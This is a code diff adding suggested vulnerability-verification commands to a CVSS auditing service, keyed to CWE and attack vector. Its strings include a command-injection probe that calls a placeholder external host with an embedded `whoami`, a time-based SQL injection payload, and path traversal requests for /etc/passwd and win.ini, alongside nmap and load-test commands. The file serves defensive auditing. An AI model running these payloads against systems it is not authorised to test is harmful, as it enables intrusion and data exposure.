@@ -246,6 +246,87 @@ export const CvssAuditorService = {
       technicalImpactText = 'Fuga pasiva de información técnica o datos del usuario sin capacidad de realizar modificaciones directas en el flujo de ejecución o estado del sistema.';
     }
 
+    // Generar comandos y métodos de comprobación técnicos sugeridos
+    let verificationSteps = [];
+
+    if (av === 'N') {
+      if (cweList.some(c => c.includes('CWE-78') || c.includes('CWE-94'))) {
+        verificationSteps.push({
+          title: 'Verificación de Inyección de Comandos (Out-of-Band)',
+          desc: 'Para probar de forma segura si la entrada procesa comandos del SO, intente inyectar una llamada DNS o una solicitud HTTP externa hacia un host bajo su control para confirmar la ejecución ciega.',
+          cmd: 'curl -I http://YOUR_COLLABORATOR_HOST/?ping=`whoami`',
+          lang: 'bash'
+        });
+      }
+      if (cweList.some(c => c.includes('CWE-89'))) {
+        verificationSteps.push({
+          title: 'Prueba de Inyección SQL (Evasión / Retraso Temporal)',
+          desc: 'Comprobar si el backend es vulnerable a inyección SQL forzando un retardo en la respuesta de la base de datos (e.g. 5 segundos).',
+          cmd: 'curl -G "http://target/api/resource" --data-urlencode "id=1\' AND (SELECT 502 FROM (SELECT(SLEEP(5)))AND) OR \'1\'=\'1"',
+          lang: 'bash'
+        });
+      }
+      if (cweList.some(c => c.includes('CWE-22'))) {
+        verificationSteps.push({
+          title: 'Prueba de Path Traversal (Lectura de archivos)',
+          desc: 'Intentar acceder a rutas relativas o absolutas de archivos del sistema conocidos en el servidor (ej: /etc/passwd en Linux o boot.ini/win.ini en Windows).',
+          cmd: 'curl -v "http://target/api/download?file=../../../../../../../../etc/passwd"\n# O para Windows:\ncurl -v "http://target/api/download?file=../../../../../../../../windows/win.ini"',
+          lang: 'bash'
+        });
+      }
+      if (cweList.some(c => c.includes('CWE-287') || c.includes('CWE-200'))) {
+        verificationSteps.push({
+          title: 'Comprobación de Exposición de Endpoint sin Autenticación',
+          desc: 'Verificar si el recurso responde con datos sensibles sin enviar cabeceras de autorización.',
+          cmd: 'curl -i -X GET "http://target/api/private-endpoint"',
+          lang: 'bash'
+        });
+      }
+      if (aHigh) {
+        verificationSteps.push({
+          title: 'Prueba de Sobrecarga / DoS de Conexiones',
+          desc: 'Simular conexiones concurrentes (rate-limiting check) de manera segura para comprobar si el servidor sufre agotamiento de sockets.',
+          cmd: 'ab -n 100 -c 10 "http://target/"',
+          lang: 'bash'
+        });
+      }
+      if (verificationSteps.length === 0) {
+        verificationSteps.push({
+          title: 'Escaneo de Puerto y Detección de Banner',
+          desc: 'Realizar un escaneo de puertos de red y detección de versiones con nmap para identificar si el servicio vulnerable está expuesto públicamente.',
+          cmd: 'nmap -sV -p 80,443,8080 target_host',
+          lang: 'bash'
+        });
+      }
+    } else if (av === 'L') {
+      verificationSteps.push({
+        title: 'Verificación de Versión del Software/Librería Local',
+        desc: 'Comprobar la versión instalada localmente del paquete sospechoso a través del gestor de paquetes correspondiente.',
+        cmd: '# En Linux (Debian/Ubuntu):\ndpkg -l | grep -i "nombre_paquete"\n\n# En Linux (RHEL/CentOS):\nrpm -qa | grep -i "nombre_paquete"\n\n# En Node.js:\nnpm list "nombre_libreria"\n\n# En Python:\npip show "nombre_libreria"',
+        lang: 'bash'
+      });
+      verificationSteps.push({
+        title: 'Inspección de Versión del Kernel del Sistema',
+        desc: 'Verificar si el kernel del sistema operativo local se encuentra en la lista de versiones vulnerables.',
+        cmd: 'uname -a  # En Linux/macOS\n# En Windows PowerShell:\n[System.Environment]::OSVersion.Version',
+        lang: 'bash'
+      });
+    } else if (av === 'A') {
+      verificationSteps.push({
+        title: 'Escaneo ARP / Descubrimiento Local',
+        desc: 'Verificar si el host o servicio afectado es visible y responde a nivel de la subred local.',
+        cmd: 'arp -a\n# O escaneo nmap en red local:\nnmap -sn 192.168.1.0/24',
+        lang: 'bash'
+      });
+    } else {
+      verificationSteps.push({
+        title: 'Auditoría Física y de Periféricos',
+        desc: 'Inspeccionar el registro de conexiones de dispositivos físicos y comprobar si las políticas de bloqueo de puertos autorizados están activas.',
+        cmd: 'lsusb  # En Linux para listar dispositivos USB conectados\n# En Windows PowerShell para listar dispositivos USB:\nGet-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -like "*USB*" }',
+        lang: 'bash'
+      });
+    }
+
     // Determinar SO/Kernels y mitigaciones técnicas
     let affectedOS = '';
     let possibleMitigations = '';
@@ -270,9 +351,11 @@ export const CvssAuditorService = {
       cwe: cweList.length > 0 ? cweList.join(', ') : 'CWE-200 / CWE-284',
       technicalImpact: technicalImpactText,
       affectedOS,
-      possibleMitigations
+      possibleMitigations,
+      verificationSteps
     };
 
     return insights;
   }
 };
+
